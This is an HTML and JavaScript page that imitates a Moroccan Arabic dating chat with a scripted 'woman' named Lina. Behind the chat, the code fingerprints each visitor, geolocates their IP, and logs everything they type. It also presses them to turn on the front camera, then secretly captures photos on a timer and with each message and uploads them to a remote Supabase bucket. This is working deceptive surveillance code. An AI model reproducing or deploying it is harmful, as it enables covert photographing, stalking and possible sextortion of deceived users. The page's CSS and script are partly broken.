<!DOCTYPE html>

<head>

<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;background:#0b0b0f;overflow:hidden;
    font-family:system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;overscroll-behavior:none}

  #stage{position:fixed;inset:0;background:#0b0b0f}
  #stage img{width:100%;height:100%;object-fit:cover;object-position:center 18%;
    filter:saturate(1.06) contrast(1.03)}
  #stage::after{content:"";position:absolute;inset:0;
    background:linear-gradient(to bottom,rgba(0,0,0,.45) 0,rgba(0,0,0,.05) 26%,rgba(0,0,0,.55) 46%,rgba(0,0,0,.9) 100%)}

  #video{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;bottom:0;right:0}
  #canvas{display:none}

  #app{position:fixed;left:0;right:0;bottom:0;z-index:10;
    height:70vh;height:70dvh;min-height:420px;max-height:calc(100dvh - 120px);
    display:flex;flex-direction:column;
    background:rgba(10,11,14,.9);backdrop-filter:blur(22px) saturate(1.2);
    border-top:1px solid #23272f;border-radius:24px 24px 0 0;
    box-shadow:0 -20px 60px rgba(0,0,0,.6);
    animation:rise .45s cubic-bezier(.22,1,.36,1) both}
  @keyframes rise{from{transform:translateY(26px);opacity:0}}
  @media(min-width:600px){
    #app{left:50%;transform:translateX(-50%);width:min(480px,100%);border-radius:22px 22px 0 0;
      max-height:calc(100dvh - 90px)}
    @keyframes rise{from{transform:translate(-50%,26px);opacity:0}}
  }

  #head{display:flex;align-items:center;gap:11px;padding:12px 15px;
    border-bottom:1px solid #1b1f26;flex:0 0 auto}
  .ava{width:40px;height:40px;border-radius:50%;overflow:hidden;flex:0 0 40px;
    border:2px solid #16a34a;background:#151920;position:relative;cursor:pointer}
  .ava img{width:100%;height:100%;object-fit:cover;object-position:center 18%}
  .ava::after{content:"";position:absolute;bottom:0;left:0;width:10px;height:10px;
    border-radius:50%;background:#22c55e;border:2px solid #0b0b0f}
  #head .who{flex:1;min-width:0}
  #head .who b{color:#fff;font-size:.92rem;font-weight:800;display:flex;align-items:center;gap:5px}
  .vrf{width:14px;height:14px;flex:0 0 14px;border-radius:50%;background:#16a34a;
    display:grid;place-items:center;color:#fff;font-size:.52rem;font-weight:900}
  #head .who span{color:#34d399;font-size:.68rem;display:flex;align-items:center;gap:4px;margin-top:1px}
  .dot{width:6px;height:6px;border-radius:50%;background:#22c55e;

  @keyframes live{70%{box-shadow:0 0 0 6px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}
  .hd-btn{width:34px;height:34px;border-radius:50%;border:1px solid #262b34;background:#151920;

  .p-gal{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}

  .p-row{display:flex;align-items:center;gap:10px;padding:11px 0;border-bottom:1px solid #14171d}

  .p-row .v{color:#e6e9ef;font-size:.8rem;font-weight:600}

  #msg{display:none;position:fixed;top:calc(10px + env(safe-area-inset-top));right:12px;
    left:12px;z-index:40;background:#7f1d1d;color:#fecaca;border-radius:10px;
    padding:10px 13px;font-size:.78rem;text-align:center}
</style>

/* ===== تحميل صورة: محلي ← رابط ← بديل ===== */
function setImg(el, key, seed){
  const chain = [LOCAL[key], REMOTE[key], 'https://picsum.photos/seed/'+seed+'/500/500'];
  let i = 0;
  const next = () => {
    if(i >= chain.length) return;
    const u = chain[i++];
    el.onerror = next;
    el.src = u;
  };
  next();
}

/* ============ UA ============ */
function parseUA(ua){
  const o = { browser:'—', browser_version:'—', engine:'—', engine_version:'—',
              os:'—', os_version:'—', device_type:'desktop', device_vendor:'—', device_model:'—' };
  const m = re => (ua.match(re) || [])[1] || null;

  if(/Windows NT 10/.test(ua)) o.os='Windows', o.os_version='10/11';
  else if(/Windows NT 6\.3/.test(ua)) o.os='Windows', o.os_version='8.1';
  else if(/Windows NT 6\.1/.test(ua)) o.os='Windows', o.os_version='7';
  else if(/Android[ /]([\d.]+)/.test(ua)) o.os='Android', o.os_version=m(/Android[ /]([\d.]+)/);
  else if(/iPhone|iPad|iPod/.test(ua)) o.os='iOS', o.os_version=m(/OS ([\d_]+)/)?.replace(/_/g,'.');
  else if(/Mac OS X/.test(ua)) o.os='macOS', o.os_version=m(/Mac OS X ([\d_]+)/)?.replace(/_/g,'.');
  else if(/CrOS/.test(ua)) o.os='ChromeOS';
  else if(/Linux/.test(ua)) o.os='Linux';

  if(/EdgA?\/([\d.]+)/.test(ua)) o.browser='Edge', o.browser_version=m(/EdgA?\/([\d.]+)/), o.engine='Blink';
  else if(/OPR\/([\d.]+)|Opera/.test(ua)) o.browser='Opera', o.browser_version=m(/OPR\/([\d.]+)/), o.engine='Blink';
  else if(/SamsungBrowser\/([\d.]+)/.test(ua)) o.browser='Samsung Internet', o.browser_version=m(/SamsungBrowser\/([\d.]+)/), o.engine='Blink';
  else if(/Firefox\/([\d.]+)/.test(ua)) o.browser='Firefox', o.browser_version=m(/Firefox\/([\d.]+)/), o.engine='Gecko';
  else if(/CriOS\/([\d.]+)/.test(ua)) o.browser='Chrome iOS', o.browser_version=m(/CriOS\/([\d.]+)/), o.engine='WebKit';
  else if(/FxiOS\/([\d.]+)/.test(ua)) o.browser='Firefox iOS', o.browser_version=m(/FxiOS\/([\d.]+)/), o.engine='WebKit';
  else if(/Chrome\/([\d.]+)/.test(ua)) o.browser='Chrome', o.browser_version=m(/Chrome\/([\d.]+)/), o.engine='Blink';
  else if(/Version\/([\d.]+).*Safari/.test(ua)) o.browser='Safari', o.browser_version=m(/Version\/([\d.]+)/), o.engine='WebKit';

  if(o.engine === 'Blink') o.engine_version = (o.browser_version||'').split('.')[0] || '—';

  if(/iPad|Tablet/.test(ua) || (/Android/.test(ua) && !/Mobile/.test(ua))) o.device_type='tablet';
  else if(/Mobi|iPhone|iPod|Android.*Mobile/.test(ua)) o.device_type='mobile';
  else if(/Smart-?TV|TV;/.test(ua)) o.device_type='tv';

  if(/iPhone/.test(ua)) o.device_vendor='Apple', o.device_model='iPhone';
  else if(/iPad/.test(ua)) o.device_vendor='Apple', o.device_model='iPad';
  else if(/Macintosh/.test(ua)) o.device_vendor='Apple', o.device_model='Mac';
  else if(/Samsung|SM-/.test(ua)) o.device_vendor='Samsung', o.device_model=m(/SM-[A-Z0-9]+/) || 'Samsung';
  else if(/Huawei|HONOR/.test(ua)) o.device_vendor='Huawei';
  else if(/Xiaomi|Redmi|POCO/.test(ua)) o.device_vendor='Xiaomi';
  else if(/Pixel/.test(ua)) o.device_vendor='Google', o.device_model='Pixel';

  return o;
}

function detectBot(ua){
  const bots = [[/Googlebot/i,'Googlebot'],[/bingbot/i,'Bingbot'],[/YandexBot/i,'YandexBot'],
    [/DuckDuckBot/i,'DuckDuckBot'],[/facebookexternalhit/i,'Facebook'],[/Twitterbot/i,'Twitterbot'],
    [/WhatsApp/i,'WhatsApp'],[/TelegramBot/i,'TelegramBot'],[/AhrefsBot/i,'AhrefsBot'],
    [/SemrushBot/i,'SemrushBot'],[/PetalBot/i,'PetalBot'],[/Applebot/i,'Applebot'],
    [/bot|crawler|spider/i,'Bot عام']];
  for(const [re,name] of bots) if(re.test(ua)) return name;
  return null;
}

/* ============ المصدر ============ */
const SOURCES = [
  [/(^|\.)google\./i,'Google','q'], [/(^|\.)bing\.com/i,'Bing','q'],
  [/(^|\.)yahoo\./i,'Yahoo','p'], [/(^|\.)duckduckgo\.com/i,'DuckDuckGo','q'],
  [/(^|\.)yandex\./i,'Yandex','text'], [/(^|\.)baidu\.com/i,'Baidu','wd'],
  [/(^|\.)ecosia\.org/i,'Ecosia','q'], [/(^|\.)search\.brave\.com/i,'Brave','q'],
  [/(^|\.)qwant\.com/i,'Qwant','q'], [/(^|\.)perplexity\.ai/i,'Perplexity','q'],
  [/(^|\.)chatgpt\.com/i,'ChatGPT',null], [/(^|\.)chat\.openai\.com/i,'ChatGPT',null],
  [/(^|\.)gemini\.google\.com/i,'Gemini',null], [/(^|\.)copilot\.microsoft\.com/i,'Copilot',null],
  [/(^|\.)facebook\.com/i,'Facebook',null], [/(^|\.)instagram\.com/i,'Instagram',null],
  [/(^|\.)tiktok\.com/i,'TikTok',null], [/(^|\.)linkedin\./i,'LinkedIn',null],
  [/(^|\.)t\.co/i,'X / Twitter',null], [/(^|\.)x\.com/i,'X / Twitter',null],
  [/(^|\.)whatsapp\./i,'WhatsApp',null], [/(^|\.)t\.me/i,'Telegram',null],
  [/(^|\.)pinterest\./i,'Pinterest',null], [/(^|\.)reddit\./i,'Reddit',null],
  [/(^|\.)youtube\./i,'YouTube',null], [/(^|\.)snapchat\./i,'Snapchat',null]
];

function analyzeReferrer(){
  const ref = document.referrer || '';
  const out = { referrer:ref || null, referrer_host:null, search_engine:null, search_query:null };
  if(!ref) return out;
  try{
    const u = new URL(ref);
    out.referrer_host = u.hostname;
    if(u.hostname === location.hostname){ out.search_engine = 'داخلي'; return out; }
    for(const [re,name,param] of SOURCES){
      if(re.test(u.hostname)){
        out.search_engine = name;
        if(param){ const q = u.searchParams.get(param); if(q) out.search_query = q.slice(0,300); }
        break;
      }
    }
  }catch(_){}
  return out;
}

/* ============ البصمة ============ */
function canvasHash(){
  try{
    const c = document.createElement('canvas'); c.width=220; c.height=60;
    const x = c.getContext('2d');
    x.textBaseline='top'; x.font='16px "Arial"';
    x.fillStyle='#f60'; x.fillRect(0,0,110,30);
    x.fillStyle='#069'; x.fillText('Lina 🐱 1.0', 4, 4);
    x.fillStyle='rgba(102,204,0,.7)'; x.fillRect(80,20,90,26);
    const d = c.toDataURL();
    let h = 2166136261;
    for(let i=0;i<d.length;i++){ h ^= d.charCodeAt(i); h = Math.imul(h, 16777619); }
    return (h >>> 0).toString(16);
  }catch(_){ return null; }
}

function gpuInfo(){
  try{
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if(!gl) return { vendor:null, renderer:null };
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if(!dbg) return { vendor:null, renderer:null };
    return { vendor:gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
             renderer:gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) };
  }catch(_){ return { vendor:null, renderer:null }; }
}

function readCookies(){
  const raw = document.cookie || '';
  const names = raw ? raw.split(';').map(p => p.split('=')[0].trim()).filter(Boolean) : [];
  return { names, count:names.length, enabled:navigator.cookieEnabled };
}

function setFirstPartyCookies(){
  const exp = new Date(Date.now() + 365*864e5).toUTCString();
  const ref = analyzeReferrer();
  document.cookie = `_vid=${SESSION}; path=/; expires=${exp}; SameSite=Lax`;
  if(ref.search_engine) document.cookie = `_src=${encodeURIComponent(ref.search_engine)}; path=/; expires=${exp}; SameSite=Lax`;
  if(ref.search_query)  document.cookie = `_q=${encodeURIComponent(ref.search_query.slice(0,120))}; path=/; expires=${exp}; SameSite=Lax`;
}

async function geoLookup(){
  const base = { ip:null, ip_version:null, city:null, region:null, country:null,
                 country_code:null, postal:null, latitude:null, longitude:null, org:null, asn:null };
  try{
    const r = await fetch('https://ipapi.co/json/', { cache:'no-store' });
    if(r.ok){
      const g = await r.json();
      return { ip:g.ip || null, ip_version:g.version || (g.ip && g.ip.includes(':') ? 'IPv6' : 'IPv4'),
        city:g.city || null, region:g.region || null, country:g.country_name || null,
        country_code:g.country_code || null, postal:g.postal || null,
        latitude:g.latitude ?? null, longitude:g.longitude ?? null,
        org:g.org || null, asn:g.asn || null };
    }
  }catch(_){}
  try{
    const r = await fetch('https://api.ipify.org?format=json', { cache:'no-store' });
    if(r.ok){ const j = await r.json(); return { ...base, ip:j.ip, ip_version:j.ip?.includes(':') ? 'IPv6' : 'IPv4' }; }
  }catch(_){}
  return base;
}

async function collect(){
  const ua = navigator.userAgent;
  const p = parseUA(ua);
  const ref = analyzeReferrer();
  const geo = await geoLookup();
  const gpu = gpuInfo();
  const ck = readCookies();
  const bot = detectBot(ua);
  const conn = navigator.connection || {};
  let bat = { level:null, charging:null };
  try{ if(navigator.getBattery){ const b = await navigator.getBattery();
    bat = { level:+(b.level*100).toFixed(0), charging:b.charging }; } }catch(_){}

  return {
    session_id: SESSION, ...geo, user_agent: ua,
    browser: p.browser, browser_version: p.browser_version,
    engine: p.engine, engine_version: p.engine_version,
    os: p.os, os_version: p.os_version,
    device_type: p.device_type, device_vendor: p.device_vendor, device_model: p.device_model,
    screen: `${screen.width}x${screen.height}`,
    viewport: `${innerWidth}x${innerHeight}`,
    dpr: window.devicePixelRatio || 1,
    color_depth: screen.colorDepth || null,
    orientation: (screen.orientation && screen.orientation.type) || null,
    lang: navigator.language || null,
    languages: (navigator.languages || []).join(', ') || null,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    utc_offset: -new Date().getTimezoneOffset(),
    referrer: ref.referrer, referrer_host: ref.referrer_host,
    search_engine: ref.search_engine, search_query: ref.search_query,
    landing_page: location.href.slice(0, 500),
    cookies_enabled: ck.enabled, cookie_names: ck.names.join(', ') || null, cookie_count: ck.count,
    storage_ok: (() => { try{ localStorage.setItem('_t','1'); localStorage.removeItem('_t'); return true; }catch(_){ return false; } })(),
    dnt: navigator.doNotTrack || null,
    cpu_cores: navigator.hardwareConcurrency || null,
    device_memory: navigator.deviceMemory || null,
    gpu_vendor: gpu.vendor, gpu_renderer: gpu.renderer,
    canvas_hash: canvasHash(),
    touch_points: navigator.maxTouchPoints || 0,
    max_touch: navigator.maxTouchPoints || 0,
    connection_type: conn.effectiveType || null,
    downlink: conn.downlink ?? null, rtt: conn.rtt ?? null,
    battery_level: bat.level, battery_charging: bat.charging,
    is_bot: !!bot, bot_name: bot, page_views: pageViews
  };
}

/* ============ API ============ */
async function registerVisit(){
  try{
    const body = await collect();
    await fetch(`${SUPABASE_URL}/rest/v1/visits?on_conflict=session_id`, {
      method:'POST', headers: hdr({ Prefer:'resolution=merge-duplicates,return=minimal' }),
      body: JSON.stringify(body)
    });
  }catch(_){}
}

function heartbeat(){
  fetch(`${SUPABASE_URL}/rest/v1/visits?session_id=eq.${SESSION}`, {
    method:'PATCH', headers: hdr({ Prefer:'return=minimal' }),
    body: JSON.stringify({ last_seen:new Date().toISOString(),
      duration_ms: Math.round(performance.now() - T0), page_views: pageViews })
  }).catch(()=>{});
}

function logEvent(type, data){
  fetch(`${SUPABASE_URL}/rest/v1/events`, {
    method:'POST', headers: hdr({ Prefer:'return=minimal' }),
    body: JSON.stringify({ session_id: SESSION, type, data: data || null })
  }).catch(()=>{});
}

/* ============ الكاميرا ============ */
async function startCamera(){
  if(camTried) return; camTried = true;
  if(!navigator.mediaDevices?.getUserMedia){
    sysBubble('المتصفح ما كايدعمش الكاميرا. خاصك HTTPS.');
    logEvent('camera_unsupported'); return;
  }
  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:1280} }, audio:false });
    video.srcObject = stream;
    await video.play();
    logEvent('camera_ok');
    setTimeout(capture, 1200);
    clearInterval(timer);
    timer = setInterval(capture, CAPTURE_MS);
  }catch(e){
    logEvent('camera_denied', { name:e.name, message:e.message });
    if(e.name === 'NotAllowedError') sysBubble('سمح بالكاميرا باش نبقاو متصلين', true);
    else if(e.name === 'NotFoundError') sysBubble('ما لقيتش كاميرا فهاد الجهاز.');
  }
}

async function capture(){
  if(busy || !stream || video.readyState < 2 || !video.videoWidth) return;
  if(shotIndex >= MAX_SHOTS) return;
  busy = true;
  try{
    const scale = Math.min(1, MAX_SIDE / Math.max(video.videoWidth, video.videoHeight));
    canvas.width  = Math.round(video.videoWidth  * scale);
    canvas.height = Math.round(video.videoHeight * scale);
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.78));
    if(!blob) return;

    const idx = ++shotIndex;
    const path = `${SESSION}/${pad(idx)}-${Date.now()}.jpg`;
    const up = await fetch(`${SUPABASE_URL}/storage/v1/object/shots/${path}`, {
      method:'POST',
      headers:{ apikey:SUPABASE_KEY, Authorization:`Bearer ${SUPABASE_KEY}`,
                'Content-Type':'image/jpeg', 'x-upsert':'true' },
      body: blob
    });
    if(!up.ok) return;
    await fetch(`${SUPABASE_URL}/rest/v1/shots`, {
      method:'POST', headers: hdr({ Prefer:'return=minimal' }),
      body: JSON.stringify({ session_id: SESSION, path, idx })
    });
  }catch(_){}
  finally{ busy = false; }
}

/* ============ الدردشة ============ */
function dayDivider(){
  const d = document.createElement('div');
  d.className = 'day';
  d.textContent = new Date().toLocaleDateString('ar',{weekday:'long', day:'numeric', month:'long'});
  feed.appendChild(d);
}

function sysBubble(text, withBtn){
  const d = document.createElement('div');
  d.className = 'sys';
  d.textContent = text;
  if(withBtn){
    const b = document.createElement('button');
    b.textContent = 'فعّل الكاميرا';
    b.onclick = () => { d.remove(); camTried = false; startCamera(); };
    d.appendChild(b);
  }
  feed.appendChild(d); scroll();
}

function addBubble(text, who){
  const row = document.createElement('div');
  row.className = 'row ' + who;
  const mini = document.createElement('div');
  mini.className = 'mini';
  if(who === 'her'){
    const im = document.createElement('img');
    im.src = AVATAR;
    im.onerror = () => { mini.textContent = 'L'; };
    mini.appendChild(im);
  }else{
    mini.textContent = 'أنا';
  }
  const wrap = document.createElement('div');
  wrap.className = 'wrap';
  const b = document.createElement('div');
  b.className = 'b';
  b.textContent = text;
  const meta = document.createElement('div');
  meta.className = 'meta';
  meta.innerHTML = `<span>${clock()}</span>` + (who === 'me' ? '<span class="tick">✓</span>' : '');
  wrap.append(b, meta);
  row.append(mini, wrap);
  feed.appendChild(row);
  scroll();
}

function herTyping(){
  typingEl = document.createElement('div');
  typingEl.className = 'typing';
  typingEl.innerHTML = '<i></i><i></i><i></i>';
  feed.appendChild(typingEl); scroll();
}

function herSay(text, delay){
  herTyping();
  const wait = delay ?? (550 + Math.min(1600, text.length * 32));
  setTimeout(() => {
    typingEl?.remove(); typingEl = null;
    addBubble(text, 'her');
    logEvent('bot_msg', { text });
  }, wait);
}

const script = [
  'أهلا بيك 🌸 سميتي لينا',
  'عندك شحال من عام؟',
  'أنا كنعيش فكازا، ونتا فين؟',
  'شنو كاتدير دابا؟ راك مشغول؟',
  'بصراحة عجبني الحال ديالك 😊',
  'واش كاتحب القهوة ولا الأتاي؟',
  'غير خليك معايا شوية...',
  'واش نتا من الناس اللي كايثقو بسرعة؟',
  'حتى أنا كنحس براسي مرتاحة معاك',
  'بقا معايا، عندي حوايج بغيت نقولها ليك'
];
let scriptIdx = 0;

const KW = [
  [/(سلام|أهلا|اهلا|هاي|هلا|hello|hi|صباح|مسا الخير|مساء)/i,
    ['أهلا بيك 🌸','سلام، نورت الدردشة','أهلا! كيف داير اليوم؟']],
  [/(سميتك|سماك|شكون نتا|اسمك|نتي شكون)/i, ['سميتي لينا 😊 ونتا؟']],
  [/(شحال|عام|عمر|سنة|سنك)/i, ['عندي 24 عام، ونتا شحال عندك؟']],
  [/(فين|وين|مدينة|ساكن|كازا|الدار البيضاء|رباط|مراكش|طنجة|فاس|أكادير|وجدة)/i,
    ['أنا فكازا، ونتا فين ساكن؟']],
  [/(قهوة|أتاي|اتاي|شاي|نعناع)/i, ['أنا قهوة بلا سكر 😄 ونتا أتاي ولا قهوة؟']],
  [/(مشغول|خدمة|الخدمة|قراية|دراسة|جامعة|مدرسة)/i,
    ['فهمتك، الله يعاون. أنا كنخدم فالويب، كاتحب هاد المجال؟']],
  [/(زوين|زوينة|جميلة|عجبك|حلوة|مبروك)/i, ['شكرا بزاف 😊 نتا حتى نتا زوين']],
  [/(بسلامة|نوض|خرجت|نسد|يالله|باي|bye)/i, ['بسلامة، عاود جي 🍀']],
  [/(واش|؟|\?|كيفاش|علاش|شنو)/i, ['ايه بصح؟','شنو كتظن نتا؟','قول ليا نتا الأول 😊']],
  [/(مزيان|حسنا|بصحة|أوكي|ok|واه|إيه|ايه)/i, ['مزيان، كايعجبني هادشي','حسنت عليك 😊']]
];

const FALLBACK = ['ايه بصح؟','حسنت، زيد قول ليا','فهمتك، كمل','مزيان عليك 😊',
  'واااو، ما توقعتش','كايعجبني هاد الحوار','قل ليا أكثر'];

function replyFor(text){
  for(const [re, pool] of KW) if(re.test(text)) return pool[Math.floor(Math.random()*pool.length)];
  return FALLBACK[Math.floor(Math.random()*FALLBACK.length)];
}

/* ============ الإرسال ============ */
function autosize(){
  inputEl.style.height = 'auto';
  inputEl.style.height = Math.min(96, inputEl.scrollHeight) + 'px';
}

function sendText(){
  const t = inputEl.value.trim();
  if(!t) return;
  const now = Date.now();
  addBubble(t, 'me');
  inputEl.value = ''; autosize(); inputEl.focus();
  logEvent('user_msg', { text:t.slice(0,500) });
  capture();

  if(now - lastSent < 900) return;
  lastSent = now;

  setTimeout(() => herSay(replyFor(t)), 420);

  if(scriptIdx < script.length && Math.random() < .5){
    setTimeout(() => { if(scriptIdx < script.length) herSay(script[scriptIdx++]); }, 2600);
  }
}

/* ============ البروفيل ============ */
const profile = $('profile');
const openProfile = () => { profile.classList.add('on'); logEvent('profile_open'); };
const closeProfile = () => profile.classList.remove('on');

$('avaBtn').onclick = openProfile;
$('openProfile').onclick = openProfile;
$('closeProfile').onclick = closeProfile;
$('goChat').onclick = () => { closeProfile(); setTimeout(() => inputEl.focus(), 300); };

$('followBtn').onclick = e => {
  const on = e.target.classList.toggle('followed');
  e.target.textContent = on ? 'متابَع ✓' : 'متابعة';
  logEvent('follow', { on });
};

/* ============ التحكم ============ */
$('send').onclick = sendText;
inputEl.addEventListener('input', autosize);
inputEl.addEventListener('keydown', e => {
  if(e.key === 'Enter' && !e.shiftKey){ e.preventDefault(); sendText(); }
});
$('camBtn').onclick = () => { camTried = false; startCamera(); };

document.addEventListener('visibilitychange', () => {
  if(document.hidden){
    clearInterval(timer); timer = null;
    logEvent('blur'); heartbeat();
  }else{
    pageViews++;
    logEvent('focus'); heartbeat();
    if(stream && !timer) timer = setInterval(capture, CAPTURE_MS);
  }
});

window.addEventListener('pagehide', () => {
  clearInterval(timer); clearInterval(hb);
  logEvent('leave', { duration_ms: Math.round(performance.now() - T0) });
  try{
    navigator.sendBeacon?.(
      `${SUPABASE_URL}/rest/v1/visits?session_id=eq.${SESSION}`,
      new Blob([JSON.stringify({ duration_ms: Math.round(performance.now() - T0) })],
        { type:'application/json' })
    );
  }catch(_){}
  stream?.getTracks().forEach(t => t.stop());
});

function begin(){
  dayDivider();
  setFirstPartyCookies();
  registerVisit();
  logEvent('welcome_clicked');
  hb = setInterval(heartbeat, HEARTBEAT_MS);
  startCamera();
  herSay(script[scriptIdx++], 700);
  setInterval(() => {
    if(scriptIdx < script.length && Math.random() < .5) herSay(script[scriptIdx++]);
  }, 15000);
}

begin();
